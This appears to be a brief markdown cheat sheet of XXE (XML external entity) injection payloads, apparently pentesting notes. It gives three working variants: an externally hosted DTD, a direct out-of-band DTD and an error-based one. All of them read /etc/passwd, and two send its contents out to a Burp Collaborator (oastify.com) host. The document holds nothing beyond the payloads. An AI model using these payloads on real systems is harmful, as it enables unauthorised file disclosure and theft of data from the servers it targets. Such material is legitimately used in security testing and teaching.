
### Host DTD on remote server
```xml
_____ in the request _____
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY % get SYSTEM "http://10.10.10.10/exploit">
	%get;
]>

_____ in my server _____ Changed content type to application/xml

	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % expand "<!ENTITY &#x25; ext SYSTEM 'http://wyy3ecdnxsrzmfz5t8xw0pf7pyvpjh76.oastify.com?x=%file;'>" >
	%expand;
	%ext;
```

### Direct DTD
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % expand "<!ENTITY &#x25; ext SYSTEM 'http://wyy3ecdnxsrzmfz5t8xw0pf7pyvpjh76.oastify.com?x=%file;'>" >
	%expand;
	%ext;
]>
```

### Error based XXE 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test[
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % expand "<!ENTITY &#x25; ext SYSTEM 'file:///WrongFilePath/%file;'>" >
	%expand;
	%ext;
]>
```